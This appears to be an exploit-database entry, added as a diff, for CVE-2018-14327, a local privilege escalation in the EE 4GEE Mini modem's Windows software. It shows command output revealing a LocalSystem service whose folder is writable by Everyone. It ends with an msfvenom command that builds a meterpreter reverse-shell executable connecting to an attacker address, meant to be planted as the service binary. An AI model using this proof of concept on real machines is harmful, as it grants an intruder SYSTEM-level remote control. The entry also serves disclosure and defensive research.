@@ -1,0 +1,73 @@
+# Title: EE 4GEE Mini EE40_00_02.00_44 - Privilege Escalation 
+# Date: 2018-09-22
+# Software Version: EE40_00_02.00_44
+# Tested on: Windows 10 64-bit and Windows 7 64-bit
+# Exploit Author: Osanda Malith Jayathissa (@OsandaMalith)
+# Original Advisory: http://blog.zerodaylab.com/2018/09/zerodaylab-discovers-ee-unquoted.html
+# Original Write-up: https://osandamalith.com/2018/09/17/ee-4gee-mini-local-privilege-escalation-vulnerability-cve-2018-14327/
+# CVE: CVE-2018-14327
+# References
+# https://www.theregister.co.uk/2018/09/19/ee_modem_vuln/
+# https://thehackernews.com/2018/09/4g-ee-wifi-modem-hack.html
+
+# PoC
+
+C:\>sc qc "Alcatel OSPREY3_MINI Modem Device Helper"
+[SC] QueryServiceConfig SUCCESS
+ 
+SERVICE_NAME: Alcatel OSPREY3_MINI Modem Device Helper
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Alcatel OSPREY3_MINI Modem Device Helper
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+
+# Weak Folder Permissions
+
+C:\Program Files (x86)\Web Connecton>icacls EE40
+EE40 Everyone:(OI)(CI)(F)
+     NT SERVICE\TrustedInstaller:(I)(F)
+     NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+     NT AUTHORITY\SYSTEM:(I)(F)
+     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+     BUILTIN\Administrators:(I)(F)
+     BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+     BUILTIN\Users:(I)(RX)
+     BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+     CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+ 
+Successfully processed 1 files; Failed processing 0 files
+ 
+C:\Program Files (x86)\Web Connecton>
+C:\Program Files (x86)\Web Connecton>
+C:\Program Files (x86)\Web Connecton>icacls EE40\BackgroundService
+EE40\BackgroundService Everyone:(OI)(CI)(F)
+                       Everyone:(I)(OI)(CI)(F)
+                       NT SERVICE\TrustedInstaller:(I)(F)
+                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Users:(I)(RX)
+                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                       APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+                       APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+ 
+Successfully processed 1 files; Failed processing 0 files
+
+# Example Payload
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.4 lport=443 -f exe -o rev_shell.exe
